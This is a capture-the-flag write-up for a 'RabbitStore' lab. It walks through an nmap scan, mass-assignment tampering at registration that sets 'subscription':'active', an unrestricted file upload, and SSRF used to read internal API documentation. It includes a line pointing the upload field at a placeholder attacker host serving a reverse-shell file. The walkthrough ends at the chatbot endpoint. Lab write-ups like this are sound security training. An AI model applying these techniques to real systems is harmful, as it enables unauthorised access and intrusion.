# RabbitStore 
Demonstrate your web application testing skills and the basics of Linux to escalate your privileges.

## Recon

`nmap -A -T4 10.81.150.28`

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-28 19:34 +0800
Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.00% done; ETC: 19:34 (0:00:00 remaining)
Nmap scan report for 10.81.150.28
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://cloudsite.thm/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=2/28%OT=22%CT=1%CU=39150%PV=Y%DS=3%DC=T%G=Y%TM=69A2D30
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FD%GC
OS:D=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E
OS:8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%
OS:W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   280.55 ms 192.168.128.1
2   ...
3   280.69 ms 10.81.150.28

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.85 seconds
```

## Broken Access Control 

A website is hosted at port 80, and an attempt to access the website redirects the user to `cloudsite.thm`, which can be added to the `/etc/hosts` file with the IP address of the machine pointing to this URL.
Upon accessing `cloudsite.thm`, there are 6 subpages: home, about us, services, blog, contact us, and the login/signup page. 

Looking at the tech stack via Wappalyzer, the website is built with Express.js

After registering as a user with an email address and a password, i.e. `test@test.com: password`, the user is redirected to `http://storage.cloudsite.thm/dashboard/inactive` upon login with a message displayed:
```
Sorry, this service is only for internal users working within the organization and our clients. If you are one of our clients, please ask the administrator to activate your subscription.
Thank You
Have a nice day
```
Perhaps, an attempt can be made to access the internal services by intercepting the request with a proxy and changing `/dashboard/inactive` to `/dashboard/active`. 
After trying to break the access control this way, a message is returned in JSON, `"message":"Your subscription is inactive. You cannot use our services."` 

After further inspecting the flow by intercepting a login request, we can see a JSON Web Token is supplied as a cookie in the POST request. 

`Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJzdWJzY3JpcHRpb24iOiJpbmFjdGl2ZSIsImlhdCI6MTc3MjI4MTM4NiwiZXhwIjoxNzcyMjg0OTg2fQ.MKhsR_cF9KF8eNC9JX77CwZTdjpcRGaPwMIR024sOd0`

Decoding the JWT, the header is decoded to include `{"alg":"HS256","typ":"JWT"}, the payload includes `{"email":"test@test.com","subscription":"inactive","iat":"1772281386", "exp":"1772284986"}, and of course the HS256 secret.
Parameter tampering with the JWT did not work for the login flow, but perhaps this can be done with the registration flow as well. 

It worked! 
> We have broken access control. By intercepting the registration flow and appending `"subscription":"active"` to the request when signing up a new user, this breaks the access control mechanism. 

## File Upload Vulnerability
There is a file upload feature at the `/dashboard/active` endpoint and it seems that the intended action is to allow users to upload image files from localhost (their own computer) or from a user-supplied URLs. 
However, other filetypes can be uploaded such as txt, php files and others. This indicates that RCE is possible. 

The files get uploaded to the web server at the `/api/uploads/` endpoint. 

I tried attempting to access the files I've uploaded via their specified `/api/uploads/<file>` path, but this didn't work. 

SSRF could be a solid attack vector.
So, I started a Python web server, `python3 -m http.server 80` and supplied the url including the revshell to the input text box: `http://<attacker_ip>:80/test.txt`  

This worked, so perhaps exposure of unintended resources via SSRF is possible. 

## Server-Side Request Forgery (SSRF)

Supplying `http://localhost/` to get the website page worked. 

Express.js runs on port 3000. Let's fuzz for API endpoints: `ffuf -u http://storage.cloudsite.thm/api/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`

```
Login                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 252ms]
docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 349ms]
login                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 260ms]
register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 307ms]
uploads                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 294ms]
```

Ffuf found `docs`, so we could try supplying `http://localhost:3000/docs` to retrieve the internal documentation file. 

The documentation text is as follows: 
```
Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.
```

`/api/fetch_messages_from_chatbot` sounds interesting.

Fetching the file `/api/fetch_messages_from_chatbot`, the file contains the following text: `{"message":"Token not provided"}`




 
